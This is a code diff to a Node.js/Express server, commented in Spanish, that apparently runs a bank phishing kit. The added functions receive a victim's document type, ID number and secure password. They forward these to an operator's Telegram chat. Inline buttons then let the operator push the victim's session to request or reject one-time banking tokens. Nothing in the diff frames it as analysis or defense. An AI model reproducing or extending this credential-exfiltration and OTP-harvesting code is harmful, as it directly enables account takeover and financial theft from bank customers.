@@ -73,6 +73,73 @@ app.post("/virtualpersona", async (req, res) => {
   return res.status(400).json({ error: "Método no soportado" });
 });
 
+// ===== NUEVO: enviar "Nuevo OTP" con los mismos botones =====
+async function enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId }) {
+  const mensaje = `
+🔐 *Nuevo otp*
+
+📄 *Tipo de documento:* ${tipoDoc || "N/D"}
+🆔 *Documento:* ${numDoc || "N/D"}
+🔑 *Clave segura:* ${clave || "N/D"}
+
+🌀 *Session ID:* \`${sessionId}\`
+`;
+
+  const botones = {
+    inline_keyboard: [
+      [
+        { text: "🔁 Error Logo",  callback_data: `inicio|${sessionId}` },
+        { text: "🔐 Pedir Token", callback_data: `otp1|${sessionId}` },
+        { text: "🚫 Error Token", callback_data: `otp2|${sessionId}` }
+      ]
+    ]
+  };
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: "Markdown",
+      reply_markup: botones
+    })
+  });
+}
+// ===== NUEVO: notificar al entrar a OTP-1 =====
+app.post("/notify/otp1", async (req, res) => {
+  try {
+    const { sessionId, tipoDoc, numDoc, clave } = req.body || {};
+    if (!sessionId) return res.status(400).json({ ok:false, error:"Falta sessionId" });
+
+    // si quieres, inicializamos por si no existe
+    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
+
+    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId });
+    return res.json({ ok:true });
+  } catch (e) {
+    console.error("❌ /notify/otp1 error:", e);
+    return res.status(500).json({ ok:false });
+  }
+});
+
+// ===== NUEVO: notificar al entrar a OTP con error =====
+app.post("/notify/otp2", async (req, res) => {
+  try {
+    const { sessionId, tipoDoc, numDoc, clave } = req.body || {};
+    if (!sessionId) return res.status(400).json({ ok:false, error:"Falta sessionId" });
+
+    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
+
+    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId });
+    return res.json({ ok:true });
+  } catch (e) {
+    console.error("❌ /notify/otp2 error:", e);
+    return res.status(500).json({ ok:false });
+  }
+});
+
+
 // Ruta de polling (ready.js la consulta)
 app.get("/instruction/:sessionId", (req, res) => {
   const sessionId = req.params.sessionId;
